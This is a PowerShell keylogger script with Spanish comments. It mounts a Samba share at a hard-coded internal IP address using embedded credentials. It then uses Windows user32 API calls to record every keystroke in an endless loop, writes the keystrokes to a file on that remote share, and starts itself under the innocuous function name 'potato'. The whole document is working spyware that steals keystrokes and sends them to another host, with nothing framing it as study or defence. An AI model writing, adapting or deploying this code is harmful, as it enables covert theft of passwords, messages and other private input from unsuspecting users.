# Credenciales Samba
$usuario = "no_autorizado"
$contrasenya = "noaut1"
$rutaSamba = "\\192.168.12.103\no_autorizado"

# Monta el Samba
net use $rutaSamba /user:$usuario $contrasenya

# Función para el keylogger
function potato($Path="\\192.168.12.103\no_autorizado\info.txt") 
{
  # Signatures para llamadas a API
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # Carga las firmas 
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # Crea el archivo de salida
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    # Bucle infinito para capturar las pulsaciones de teclas
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # Escanea todos los códigos ASCII por encima de 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Obtiene el estado actual de la tecla
        $state = $API::GetAsyncKeyState($ascii)

        # ¿La tecla está presionada?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # Traduce el código de escaneo a código real
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # Obtiene el estado del teclado para las teclas virtuales
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # Prepara un StringBuilder para recibir la tecla de entrada
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # Traduce la tecla virtual
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # Añade la tecla al archivo de registro
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {   
  }
}

# Inicia el keylogger
potato
